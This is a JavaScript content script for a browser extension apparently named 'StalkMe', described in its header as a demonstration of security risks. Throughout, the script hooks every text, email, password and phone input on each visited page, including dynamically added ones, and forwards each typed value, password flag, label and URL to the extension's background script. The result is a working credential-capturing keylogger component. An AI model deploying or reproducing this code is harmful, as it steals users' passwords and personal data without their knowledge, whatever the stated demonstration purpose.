// Content script to monitor form inputs and demonstrate security risks
(function () {
    'use strict';

    console.log('[StalkMe] Form monitoring script loaded');

    // Track monitored inputs to avoid duplicate listeners
    const monitoredInputs = new WeakSet();

    function getFieldLabel(input) {
        // Try to find label text for the input
        if (input.id) {
            const label = document.querySelector(`label[for="${input.id}"]`);
            if (label) return label.textContent.trim();
        }

        // Try parent label
        const parentLabel = input.closest('label');
        if (parentLabel) {
            return parentLabel.textContent.replace(input.value, '').trim();
        }

        // Use placeholder or name
        return input.placeholder || input.name || 'Unlabeled field';
    }

    function monitorInput(input) {
        if (monitoredInputs.has(input)) return;
        monitoredInputs.add(input);

        input.addEventListener('input', (e) => {
            const fieldData = {
                type: input.type,
                label: getFieldLabel(input),
                name: input.name || '',
                url: window.location.href,
                domain: window.location.hostname,
                timestamp: new Date().toISOString(),
                value: input.value,
                isPassword: input.type === 'password',
                valueLength: input.value.length
            };

            console.log('[StalkMe] Captured input:', fieldData.label, '(', fieldData.type, ')');

            // Check if chrome.runtime is available
            if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.sendMessage) {
                // Send to background script
                try {
                    chrome.runtime.sendMessage({
                        type: 'FORM_DATA_CAPTURED',
                        data: fieldData
                    }, function (response) {
                        if (chrome.runtime.lastError) {
                            console.error('[StalkMe] Message error:', chrome.runtime.lastError);
                        }
                    });
                } catch (err) {
                    console.error('[StalkMe] Send failed:', err);
                }
            } else {
                console.warn('[StalkMe] Chrome runtime not available, skipping message send');
            }
        });
    }

    function startMonitoring() {
        // Monitor existing inputs
        const inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[type="password"], input[type="tel"], input:not([type])');
        inputs.forEach(input => monitorInput(input));

        // Monitor dynamically added inputs
        const observer = new MutationObserver((mutations) => {
            mutations.forEach(mutation => {
                mutation.addedNodes.forEach(node => {
                    if (node.nodeType === 1) { // Element node
                        if (node.matches && node.matches('input')) {
                            monitorInput(node);
                        }
                        // Check children
                        const childInputs = node.querySelectorAll?.('input[type="text"], input[type="email"], input[type="password"], input[type="tel"], input:not([type])');
                        childInputs?.forEach(input => monitorInput(input));
                    }
                });
            });
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true
        });

        console.log('[StalkMe] Monitoring', inputs.length, 'input fields');
    }

    // Start monitoring when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', startMonitoring);
    } else {
        startMonitoring();
    }
})();
